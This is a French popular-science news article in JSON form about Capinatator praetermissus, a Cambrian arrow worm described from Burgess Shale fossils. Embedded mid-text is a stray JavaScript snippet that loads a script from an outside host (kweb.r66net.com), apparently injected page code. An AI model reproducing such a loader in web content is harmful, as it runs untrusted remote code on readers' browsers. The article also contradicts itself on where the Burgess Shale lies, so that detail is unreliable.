{"title": "Ce ver du Cambrien etait une terreur des mers", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-08-17", "content": "Capinatator praetermissus  etait un predateur redoutable dans les oceans qu'il frequentait il y a environ 500 millions d'annees. Remarquablement conserves, des fossiles de ce << ver sagittaire >> eclairent d'un jour nouveau la tres longue histoire des chaetognathes, ces animaux d'aujourd'hui qui fascinent les zoologistes. Ce qu'il faut retenir Cinquante specimens d'une espece de chaetognathes, jusque-la inconnue, ont ete identifies dans des fossiles des schistes de Burgess, appartenant au musee royal de l'Ontario, au Canada. Ils ressemblent aux especes actuelles, bien presentes dans le plancton, ou ils sont des predateurs. La nouvelle espece vivait au Cambrien et montre que ce groupe a l'origine enigmatique etait deja bien diversifie juste apres l'explosion cambrienne, avec des especes de grandes tailles. Cinquante specimens d'un drole de petit animal ont ete exhumes dans les  schistes de Burgess , en Colombie-Britannique (Canada). Ce monstre est un ver avec une large tete bordee de 50 crochets. Il ne mesure que 11 cm mais sa decouverte est remarquable a plus d'un titre. D'abord a cause de son age, plus de 500 millions d'annees, ce qui situe cette  espece  dans le  Cambrien , periode qui a debute avec un episode de diversification intense appelee  explosion cambrienne . Cette epoque etait meme consideree comme la premiere de << l'ere primaire >>, quand cette terminologie avait court (on prefere aujourd'hui  Paleozoique ), les quatre milliards d'annees qui l'avaient precedee sombrant dans le <<  Precambrien  >>. Le lieu de la decouverte, lui aussi, parle au paleobiologiste. La description, ou plutot la redescription, de l'etonnante <<  faune de Burgess  >>, decouverte par hasard dans ces  schistes  en 1911, avait montre l'apparition des grands types d'organisation des animaux actuels ( arthropodes ,  mollusques  et  vertebres , notamment). Le grand chaetognathe du Cambrien en train de nager et de chasser. (c) Lars Fields, musee royal de l'Ontario, YouTube Ce ver sagittaire est remarquablement conserve Les 50 individus mis au jour sont exceptionnels aussi par leur etat de conservation, surtout celui de leurs parties molles, ce qui est tres rare... mais pas a Burgess. C'est precisement ce qui a fait la valeur des  fossiles  ecrases dans ces schistes, comme des feuilles ou des fleurs entre les pages d'un herbier.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Dans l'article publie dans  Current Biology , les deux auteurs (Derek Briggs, et Jean-Bernard Caron) decrivent leur ver comme un chaetognathe. Rien d'audacieux : ces animaux sont bien connus, en particulier parmi la  faune du Cambrien , et ils existent toujours de nos jours. Ces modestes << vers sagittaires >> (ils ressemblent a des fleches) proposent aux zoologistes une jolie enigme. Il a fallu leur forger un <<  embranchement  >>, dans l'ancienne classification, pour eux tout seuls. Ils ne ressemblent en effet a aucun autre groupe, si ce n'est par des similitudes avec des animaux tres eloignes les uns des autres, ce qui n'arrange rien. Les crochets de l'animal, bien installes sur la tete, autour de la bouche, forment un piege pour saisir des proies. (c) Musee royal de l'Ontario                               Les enigmatiques chaetognathes, des monstres planctoniques De plus, ils sont etrangement restes inchanges depuis le Cambrien. Dans les schemas de filiation des especes vivantes, la ligne menant aux chaetognathes est toujours longue, venant de loin, et representee par des pointilles. Tout juste, aujourd'hui, les apparente-t-on, avec precautions, aux <<  Protostomiens  >>, qui reunissent (entre autres) les vers de  terre , les arthropodes et les mollusques. Aujourd'hui presents dans toutes les mers, ils mesurent souvent quelques millimetres. Au sein du  plancton , ils sont de redoutables predateurs, l'equivalent des grands requins ou des  orques  a notre echelle. Sur la tete, les crochets, enormes, ne laissent guere de chances a leurs victimes, des  larves  de  poissons  et de  crustaces  par exemple. Leur nom, chaetognathe, signifie << chevelure-machoire >>, car c'est la leur caracteristique premiere. Le saviez-vous ? La faune de Burgess designe ces animaux d'abord decouverts dans les schistes de Burgess, dans l'Ontario, lors de la construction d'une voie ferree traversant le Canada d'est en ouest, en 1911. Ces animaux, qui vivaient au fond d'une mer peu profonde, ont exceptionnellement conserve leurs parties molles apres leur probable ensevelissement brutal. Transformes en schistes, les sediments dans lesquels ils se trouvaient ont protege les fossiles. Dans une premiere description, ces animaux avaient ete classes parmi des groupes existant aujourd'hui. Mais une relecture de ces fossiles a permis la decouverte d'une faune particuliere et tres diversifiee. Les animaux sont tres differents de ceux d'aujourd'hui mais presentent en revanche des caracteristiques morphologiques encore presentes dans la faune actuelle, comme la cuticule des arthropodes ou la << chorde >> des vertebres par exemple. Le meilleur endroit pour decouvrir cette faune est le  site du musee royal de l'Ontario , dans sa version francaise, avec des images et des videos remarquables. Tres efficace, cet armement a ete conserve intact depuis un demi-milliard d'annees, comme en temoigne  Capinatator praetermissus , le nom de bapteme donne par ses decouvreurs, Derek Briggs et Jean-Bernard Caron. Le genre est nouveau,  Capinator  pouvant se traduire par << nageur agrippant >> et le nom de l'espece signifiant <<  longtemps passe inapercu >> , comme l'explique le  communique du musee royal de l'Ontario , responsable de la decouverte, auquel appartient Jean-Bernard Caron et qui recele les tresors des schistes de Burgess. Lui aussi a des crochets. Ils sont meme enormes et au nombre de 25 paires, ce qui est beaucoup par rapport aux especes actuelles. Ces fossiles montrent qu'au Cambrien, ces vers devaient etre plus gros et vivaient assez pres des fonds. Ils devaient alors jouer un grand role dans les  chaines alimentaires  de l'epoque, apres s'etre diversifies durant l' explosion cambrienne . ", "theme": "planete"}